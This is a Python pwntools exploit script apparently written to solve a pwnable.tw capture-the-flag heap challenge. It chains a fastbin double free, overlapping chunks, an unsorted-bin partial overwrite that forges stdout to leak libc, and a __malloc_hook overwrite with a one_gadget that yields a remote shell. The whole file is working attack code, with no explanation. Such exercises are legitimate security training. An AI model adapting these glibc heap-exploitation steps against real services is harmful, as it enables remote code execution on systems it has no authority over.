from pwn import *

libc = ELF('./libc_64.so.6')

def allocate(size, data):
    io.recvuntil('You Choice:')
    io.sendline('1')
    io.recvuntil('Size :')
    io.sendline(str(size))
    io.recvuntil('Data :')
    io.send(data)

def free(index):
    io.recvuntil('You Choice:')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(index))

while True:
    io = remote('chall.pwnable.tw', 10308)
    # double free
    allocate(0x68, p64(0) * 3 + p64(0x71))
    allocate(0x68, p64(0) * 3 + p64(0x21) + p64(0) * 5 + p64(0x21))
    free(0)
    free(1)
    free(0)
    allocate(0x68, b'\x20')
    allocate(0x68, b'A')
    allocate(0x68, b'A')
    allocate(0x68, b'A')

    # change the size of buff[6] from 0xa1 by 0xc1 so that if the chunk is freed, it will be placed into unsorted bin.
    free(0)
    allocate(0x68, p64(0) * 3 + p64(0xa1))

    # get unsorted bin addess
    free(5)
    free(0)
    free(1)
    allocate(0x78, p64(0) * 9 + p64(0x71) + b'\xa0')
    free(7)
    allocate(0x68, p64(0) * 5 + p64(0x71) + b'\xdd\x55')
    allocate(0x68, b'A')
    _IO_MAGIC = 0xfbad0000
    _IO_IS_APPENDING = 0x1000
    _IO_CURRENTLY_PUTTING = 0x800
    payload = b'\0' * 3 + p64(0) * 6 + p64(_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING) + p64(0) * 3 + b'\x88'
    try:
        allocate(0x68, payload)
    except EOFError:
        continue
    stack_leak = io.recv(6)
    if stack_leak != b'*' * 6:
        libc.address = u64(stack_leak.ljust(8, b'\0')) - 0x3c38e0
        break
    else:
        io.close()

free(1)
allocate(0x78, p64(0) * 9 + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x23))
one_gadget = libc.address + 0xef6c4
allocate(0x68, b'A')
allocate(0x68, b'\0' * 0x13 + p64(one_gadget))

io.recvuntil('You Choice:')
io.sendline('1')
io.recvuntil('Size :')
io.sendline('16')
    
io.interactive()
